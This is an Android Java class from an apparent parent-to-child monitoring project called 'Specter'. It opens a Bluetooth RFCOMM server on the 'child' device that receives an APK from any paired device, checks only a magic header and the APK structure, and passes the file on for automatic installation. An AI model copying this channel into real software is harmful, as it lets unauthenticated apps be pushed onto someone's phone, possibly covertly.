package com.divine.specter.child.delivery;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothServerSocket;
import android.bluetooth.BluetoothSocket;
import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.UUID;

/**
 * Bluetooth Server - Receives APK via Bluetooth RFCOMM
 *
 * Runs on child device to receive APK from parent.
 * Uses RFCOMM (Bluetooth Serial Port Profile) for reliable file transfer.
 *
 * Features:
 * - RFCOMM server socket
 * - Chunked transfer with progress
 * - Auto-install received APK
 * - No pairing required (if devices already paired)
 *
 * @author Specter Development Team
 * @version 1.0
 */
public class BluetoothServer {
    private static final String TAG = "BluetoothServer";

    // Service UUID for Specter APK transfer
    // Generated UUID: openssl rand -hex 16 | sed 's/\(.\{8\}\)\(.\{4\}\)\(.\{4\}\)\(.\{4\}\)\(.\{12\}\)/\1-\2-\3-\4-\5/'
    private static final UUID SERVICE_UUID = UUID.fromString("a7f3c8d1-4e2b-4a1c-9f6d-8e3b2c1a9d7f");
    private static final String SERVICE_NAME = "SpecterApkTransfer";

    // Transfer protocol
    private static final int CHUNK_SIZE = 8192; // 8KB chunks
    private static final byte[] HEADER_MAGIC = "SPKAPK".getBytes();

    private BluetoothAdapter bluetoothAdapter;
    private BluetoothServerSocket serverSocket;
    private Thread acceptThread;
    private volatile boolean isRunning = false;

    private TransferListener listener;

    public interface TransferListener {
        void onTransferStarted(String deviceName, long fileSize);
        void onProgress(long bytesReceived, long totalBytes, float percentage);
        void onTransferComplete(File apkFile);
        void onTransferFailed(String error);
    }

    public BluetoothServer(Context context) {
        this.bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
    }

    public void setTransferListener(TransferListener listener) {
        this.listener = listener;
    }

    /**
     * Start Bluetooth server
     */
    public synchronized void start() {
        if (isRunning) {
            Log.w(TAG, "Server already running");
            return;
        }

        if (bluetoothAdapter == null) {
            Log.e(TAG, "Bluetooth not supported on this device");
            if (listener != null) {
                listener.onTransferFailed("Bluetooth not supported");
            }
            return;
        }

        if (!bluetoothAdapter.isEnabled()) {
            Log.e(TAG, "Bluetooth is disabled");
            if (listener != null) {
                listener.onTransferFailed("Bluetooth is disabled");
            }
            return;
        }

        try {
            // Create RFCOMM server socket
            serverSocket = bluetoothAdapter.listenUsingRfcommWithServiceRecord(
                SERVICE_NAME,
                SERVICE_UUID
            );

            isRunning = true;

            // Start accept thread
            acceptThread = new Thread(this::acceptLoop);
            acceptThread.setName("BT-Accept");
            acceptThread.start();

            Log.i(TAG, "Bluetooth server started on UUID: " + SERVICE_UUID);

        } catch (IOException e) {
            Log.e(TAG, "Failed to start Bluetooth server", e);
            if (listener != null) {
                listener.onTransferFailed("Failed to start server: " + e.getMessage());
            }
        }
    }

    /**
     * Stop Bluetooth server
     */
    public synchronized void stop() {
        isRunning = false;

        if (serverSocket != null) {
            try {
                serverSocket.close();
            } catch (IOException e) {
                Log.e(TAG, "Error closing server socket", e);
            }
            serverSocket = null;
        }

        if (acceptThread != null) {
            acceptThread.interrupt();
            acceptThread = null;
        }

        Log.i(TAG, "Bluetooth server stopped");
    }

    /**
     * Accept incoming connections
     */
    private void acceptLoop() {
        while (isRunning) {
            try {
                Log.d(TAG, "Waiting for connection...");

                // Block until connection received
                BluetoothSocket socket = serverSocket.accept();

                if (socket != null) {
                    String deviceName = socket.getRemoteDevice().getName();
                    Log.i(TAG, "Connection accepted from: " + deviceName);

                    // Handle connection in separate thread
                    Thread transferThread = new Thread(() -> handleTransfer(socket, deviceName));
                    transferThread.setName("BT-Transfer");
                    transferThread.start();
                }

            } catch (IOException e) {
                if (isRunning) {
                    Log.e(TAG, "Accept failed", e);
                }
                break;
            }
        }
    }

    /**
     * Handle APK transfer
     */
    private void handleTransfer(BluetoothSocket socket, String deviceName) {
        InputStream in = null;
        FileOutputStream out = null;
        File tempFile = null;

        try {
            in = socket.getInputStream();

            // Read header
            byte[] header = new byte[14]; // SPKAPK + 8 bytes file size
            readFully(in, header);

            // Validate magic
            for (int i = 0; i < HEADER_MAGIC.length; i++) {
                if (header[i] != HEADER_MAGIC[i]) {
                    throw new IOException("Invalid header magic");
                }
            }

            // Read file size (long, 8 bytes, big-endian)
            long fileSize = 0;
            for (int i = 0; i < 8; i++) {
                fileSize = (fileSize << 8) | (header[6 + i] & 0xFF);
            }

            Log.i(TAG, String.format("Receiving APK: %d bytes from %s", fileSize, deviceName));

            if (listener != null) {
                listener.onTransferStarted(deviceName, fileSize);
            }

            // Create temp file
            tempFile = File.createTempFile("bt_apk_", ".apk");
            out = new FileOutputStream(tempFile);

            // Receive file in chunks
            byte[] buffer = new byte[CHUNK_SIZE];
            long bytesReceived = 0;
            int lastProgress = 0;

            while (bytesReceived < fileSize) {
                int remaining = (int) Math.min(CHUNK_SIZE, fileSize - bytesReceived);
                int read = in.read(buffer, 0, remaining);

                if (read == -1) {
                    throw new IOException("Connection closed prematurely");
                }

                out.write(buffer, 0, read);
                bytesReceived += read;

                // Report progress
                int progress = (int) ((bytesReceived * 100) / fileSize);
                if (progress != lastProgress && listener != null) {
                    listener.onProgress(bytesReceived, fileSize, progress);
                    lastProgress = progress;
                }
            }

            out.close();
            in.close();
            socket.close();

            Log.i(TAG, "Transfer complete: " + bytesReceived + " bytes");

            // Validate APK
            if (!SmsChunker.isValidApk(readFile(tempFile))) {
                throw new IOException("Invalid APK file structure");
            }

            Log.i(TAG, "APK validation passed");

            if (listener != null) {
                listener.onTransferComplete(tempFile);
            }

        } catch (IOException e) {
            Log.e(TAG, "Transfer failed", e);

            if (tempFile != null) {
                tempFile.delete();
            }

            if (listener != null) {
                listener.onTransferFailed("Transfer error: " + e.getMessage());
            }

        } finally {
            try {
                if (out != null) out.close();
                if (in != null) in.close();
                socket.close();
            } catch (IOException e) {
                Log.e(TAG, "Error closing streams", e);
            }
        }
    }

    /**
     * Read exact number of bytes
     */
    private void readFully(InputStream in, byte[] buffer) throws IOException {
        int offset = 0;
        while (offset < buffer.length) {
            int read = in.read(buffer, offset, buffer.length - offset);
            if (read == -1) {
                throw new IOException("EOF before buffer filled");
            }
            offset += read;
        }
    }

    /**
     * Read file to byte array
     */
    private byte[] readFile(File file) throws IOException {
        byte[] data = new byte[(int) file.length()];
        java.io.FileInputStream fis = new java.io.FileInputStream(file);
        fis.read(data);
        fis.close();
        return data;
    }

    public boolean isRunning() {
        return isRunning;
    }

    public UUID getServiceUuid() {
        return SERVICE_UUID;
    }
}
